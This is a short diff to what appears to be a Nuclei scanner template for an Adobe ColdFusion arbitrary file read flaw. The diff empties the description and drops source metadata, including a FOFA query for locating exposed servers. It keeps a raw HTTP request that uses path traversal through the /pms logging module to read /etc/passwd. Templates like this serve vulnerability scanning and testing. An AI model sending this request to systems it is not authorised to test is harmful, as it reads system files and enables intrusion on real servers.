@@ -3,12 +3,8 @@ info:
   name: Adobe ColdFusion 任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gmubgys17vrgayrw'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: gmubgys17vrgayrw
-    fofa: app="Adobe-ColdFusion"
 http:
 - raw:
   - 'GET /pms?module=logging&file_name=../../../../../../../etc/passwd&number_of_lines=10000 HTTP/1.1
